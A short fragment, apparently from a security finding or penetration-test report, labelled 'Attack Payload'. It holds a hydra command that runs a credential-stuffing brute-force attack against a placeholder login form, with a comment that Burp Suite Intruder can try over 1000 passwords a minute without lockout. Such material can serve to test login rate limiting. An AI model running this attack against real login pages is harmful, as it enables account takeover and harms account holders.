**Attack Payload**:
```bash
# Credential stuffing attack using hydra
hydra -L usernames.txt -P passwords.txt https://target.com/login http-post-form "/login:username=^USER^&password=^PASS^:error=invalid"

# Burp Suite Intruder can attempt 1000+ passwords/minute without lockout
